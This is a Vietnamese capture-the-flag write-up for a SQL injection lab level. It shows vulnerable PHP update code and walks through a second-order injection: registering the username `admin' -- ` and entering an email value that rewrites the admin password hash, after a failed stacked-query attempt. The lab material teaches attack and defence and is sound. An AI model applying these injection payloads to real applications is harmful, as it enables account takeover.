# SQL Injection 8

## Thử thách về lỗi bảo mật SQL Injection
## Mục tiêu: Login as admin
Cũng như [lv7](./Lv7-advanced.md) thì ở đây Prepared Statements. Và ở dòng 17 lấy username để sử dụng tính năm update.  
Ở tính năng update nếu username = admin thì sẽ hiện ra flag.  
Khi nhấn update thì trả về hết quả thành công hay thất bại.
```
$username = $_SESSION['username'];
$email = $_POST['email'];
if ($username === 'admin')
    $message = "<h3><b>Wow you can finally log in as admin, here is your flag CBJS{FAKE_FLAG_FAKE_FLAG}</b></h3>";

if (isset($_POST['button'])) {
    try {
        $sql = "UPDATE users SET email='$email' WHERE username='$username'";
        $db_result = $database->query($sql);
        if ($db_result) {
            $message = "Successfully update your Email";
        } else {
            $message = "Failed to update your email";
        }
    } catch (mysqli_sql_exception $e) {
        $message = $e->getMessage();
    }
}
```
# Khai thác
Liệu có thể dùng sql để update user admin không.  
Có `multi-statement sql`, Các câu lệnh này thường được phân tách bằng dấu chấm phẩy (` ; `)

sql ex:
```
UPDATE users SET email='a@gmail.com' WHERE username='user1';
UPDATE users SET password=MD5('123456') WHERE username='admin';
```
Playload
```
user1'; UPDATE users SET password=MD5('123456') WHERE username='admin' -- 
```
### Cách này ko được lỗi `You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UPDATE users SET password=MD5('123456') WHERE username='admin' -- '' at line 1 `
- Câu lệnh `update` cho phép update nhiều column cùng 1 lúc:
```
UPDATE table_name
SET column1 = value1,
    column2 = value2,
    ...
WHERE điều_kiện;
```
ex:
```
UPDATE users SET email='a@gmail.com',password='gen-pass-md5' WHERE username='admin' -- '
```
đăng ý user với tên `admin' -- `. xong.  
email nhập:  
với `b8dc042d8cf7deefb0ec6a264c930b02` = huy123 [gen tại đây](https://www.md5hashgenerator.com/)
```
testaaaaa@gmail.com',password='b8dc042d8cf7deefb0ec6a264c930b02
```


